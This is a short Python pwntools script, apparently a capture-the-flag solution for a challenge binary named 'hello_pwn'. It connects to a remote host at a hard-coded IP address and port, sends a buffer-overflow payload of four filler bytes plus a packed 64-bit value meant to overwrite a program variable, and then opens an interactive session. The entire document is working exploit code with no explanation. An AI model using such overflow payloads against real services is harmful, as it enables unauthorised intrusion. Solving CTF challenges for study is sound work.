from pwn import *
# sh = process("./hello_pwn")
sh = remote("61.147.171.105",49905)
sh.recv()

payload = b'b' * 4 + p64(1853186401)

sh.sendline(payload)
sh.interactive()